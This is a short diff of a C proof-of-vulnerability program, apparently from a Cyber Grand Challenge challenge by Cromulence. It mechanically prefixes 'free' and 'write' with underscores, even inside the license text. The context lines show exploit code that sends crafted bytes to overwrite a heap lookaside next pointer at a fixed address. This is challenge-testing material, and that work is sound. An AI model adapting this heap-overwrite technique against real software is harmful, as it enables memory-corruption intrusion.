@@ -4,7 +4,7 @@ Author: Joe Rogers <joe@cromulence.com>
 
 Copyright (c) 2015 Cromulence LLC
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
+Permission is hereby granted, __free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@@ -157,7 +157,7 @@ int main(void) {
 	ReadBytes(STDIN, buf, 4);
 	if (buf[0] != '\x03' || buf[1] != '\x00') {
 		// failure
-		transmit(STDERR, "write failed\n", 14, 0);
+		transmit(STDERR, "__write failed\n", 14, 0);
 		return(-1);
 	}
 
@@ -175,7 +175,7 @@ int main(void) {
 	SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
 	SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
 	SendBytes(STDOUT, "\x00\x00\x00\x00", 4);
-	// overwrite lookaside next pointer for the free block at 0xb7fff150
+	// overwrite lookaside next pointer for the __free block at 0xb7fff150
 	SendBytes(STDOUT, "\x40\xaf\xaa\xba", 4);
 	// overwrite some more unimportant heap data
 	SendBytes(STDOUT, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
